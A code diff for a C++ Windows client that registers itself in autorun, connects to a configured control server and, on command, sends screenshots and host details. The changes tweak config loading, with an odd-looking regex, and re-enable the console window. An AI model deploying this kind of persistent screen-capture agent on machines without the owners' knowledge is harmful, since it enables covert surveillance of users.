@@ -3,6 +3,7 @@
 #include "ConfigReader.h"
 #include "OS.h"
 #include "Screenshoter.h"
+#include <regex>
 
 using namespace std;
 
@@ -15,6 +16,8 @@ string host_name;
 string host_domain_name;
 string lastActiveTime;
 TCPClient* client;
+
+map<string, string> conf;
 
 void sendScreenshot() {
     Screenshoter scrsht;
@@ -29,10 +32,13 @@ void sendScreenshot() {
 
 void useConfig(string path) {
     ConfigReader cr;
-    auto conf = cr.read(path);
+    conf = cr.read(path);
 
     server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
     server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
+
+
+
     screenshot_dir = conf["screenshot_dir"];
     host_name = OS::getPCName();
     host_domain_name = OS::getPCDomain();
@@ -54,15 +60,18 @@ void sendState() {
 }
 
 int main() {
-    FreeConsole(); // программа запускается без консоли
+    //FreeConsole(); // программа запускается без консоли
 
     client = nullptr;
     OS::addProgramToAutorun("Exe", OS::getExecProgramPath());
-    useConfig("config.txt");
+    auto programPath = OS::getExecProgramPath();
+    auto confPath = regex_replace(programPath, regex("\\.*\.exe"), "\\config.txt");
+
+    useConfig(confPath);
    
     while (true) {
         try {
-            Sleep(10);
+            Sleep(1000);
             client = new TCPClient(server_ip, server_port);
             client->connect();
         } catch (exception) {
@@ -76,11 +85,14 @@ int main() {
                 string command = client->receiveMessage();
                 if (command == "GET_SCREENSHOT")
                     sendScreenshot();
-                else if (command == "GET_STATE") 
+                else if (command == "GET_STATE") {
                     sendState();
+
+                }
             }
             catch (exception e) {
                 delete client;
+
                 break;
             }
         }
